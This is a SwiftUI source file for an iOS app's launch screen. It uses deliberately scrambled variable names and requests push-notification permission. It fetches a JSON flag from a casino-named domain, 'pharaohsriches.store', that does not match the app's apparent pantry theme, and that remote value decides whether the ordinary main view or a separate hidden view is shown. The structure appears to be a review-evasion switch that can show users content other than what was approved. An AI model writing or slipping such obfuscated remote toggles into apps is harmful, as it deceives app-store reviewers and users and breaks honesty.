
import SwiftUI
import SwiftData
import OneSignal

struct MainSwiftui: View {

    
    
    @State private var isActive = false
    @State private var logoScale: CGFloat = 0.8
    @State private var logoOpacity: Double = 0.0
    @State private var textOpacity: Double = 0.0
    @State private var ballRotation: Double = 0.0
    @State private var ballOffset: CGFloat = -200
    @State private var loadingOpacity: Double = 0.0
    @ObservedObject var oojhbvgfcg: Btsgjdhbv = Btsgjdhbv()
    @State var hhjbvhgjb:  String = "rxtrfyguhgvycv"
    @AppStorage("bvcftyghb") var bvcftyghb: Bool = true
    @AppStorage("mmbvcfgvhb") var mmbvcfgvhb: String = "xxcfcxrtyvgbh"
    @State var trgr: String = ""
    @State var ertyjtruytkuy: String = ""
    
    var body: some View {
        ZStack{
            
            
            Color.themeBackground.ignoresSafeArea()
            
            if hhjbvhgjb == "opwjhbvsdjn" || hhjbvhgjb == "jjwhguyvh" {
                if self.mmbvcfgvhb == "fresherapp" || mmbvcfgvhb == "sbhvnjdkvjsd" {
               
                        
                        
                            MainView().onAppear{
                                mmbvcfgvhb = "sbhvnjdkvjsd"
                                AppDelegate.orientationLock = UIInterfaceOrientationMask.portrait
                                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                                                UINavigationController.attemptRotationToDeviceOrientation()
                            }
                       

                    
                } else {
                    Lkjhgyvubhjsdv(yihb: oojhbvgfcg)
                }
            }
            
            
        }.onAppear {
             
                OneSignal.promptForPushNotifications(userResponse: { accepted in
                    if accepted {
                        hhjbvhgjb = "opwjhbvsdjn"
                    } else {
                        hhjbvhgjb = "jjwhguyvh"
                    }
                })
         
            
            
  
            
            if bvcftyghb {
                if let url = URL(string: "https://pharaohsriches.store/chicksypantry/chicksypantry.json") {
                    URLSession.shared.dataTask(with: url) { data, response, error in
                        if let aesdvsd = data {
                            if let avevdsv = try? JSONSerialization.jsonObject(with: aesdvsd, options: []) as? [String: Any] {
                                if let jshdbvsd = avevdsv["hgdfh563fdgh"] as? String {
                                    DispatchQueue.main.async {
                                        
                                        self.mmbvcfgvhb = jshdbvsd
                                        
                                        bvcftyghb = false
                                    }
                                }
                            }
                        } else {
                            self.mmbvcfgvhb = "sbhvnjdkvjsd"
                        }
                    }.resume()
                }
            }
        }
          
    
        
    }
}

